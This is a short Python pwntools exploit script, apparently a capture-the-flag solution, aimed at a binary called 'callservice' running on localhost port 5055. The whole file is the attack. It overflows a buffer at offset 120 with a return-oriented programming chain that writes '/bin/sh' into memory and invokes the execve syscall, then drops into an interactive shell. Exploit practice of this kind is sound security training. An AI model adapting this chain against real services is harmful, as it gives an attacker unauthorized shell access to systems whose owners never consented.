from pwn import *
context.arch = 'amd64'

binary = ELF('./callservice')
p = process(binary.path)
p = remote("localhost", 5055)

# p: process = gdb.debug(binary.path,'''
#     b main
#     c
# ''')

# Init ROP Chain Vals
# 1: other vals
shcode: bytes = b'/bin/sh\x00'
shcode_ptr = 0x404000

syscall: int = 0x401206

# 2: end goal vals
RAX: int = 0x3b
RDI: int = shcode_ptr
RSI: int = 0
RDX: int = 0

# 3: gadgets
pop_rax = 0x4011fe
pop_rdi = 0x401200
pop_rsi = 0x401202
pop_rdx = 0x401204

mov_rsi_rdi = 0x401209

# Creating ROP Chain
rop = ROP(binary)

# First store /bin/sh at shcode_ptr
rop.raw([
    pop_rdi, shcode_ptr,
    pop_rsi, shcode,
    mov_rsi_rdi,
])

# Then execute execve syscall
rop.raw([
    pop_rax, RAX,        # RAX = 0x3b (execve)
    pop_rdi, RDI,        # RDI = address of "/bin/sh\x00"
    pop_rsi, RSI,        # RSI = 0
    pop_rdx, RDX,        # RDX = 0
    syscall              # Execute syscall
])

offset = 120

payload = fit({
    offset: rop.chain()
})

# Send entire payload
p.sendline(b'1')
p.recvuntil(b'feedback:')
p.sendline(payload)
p.interactive()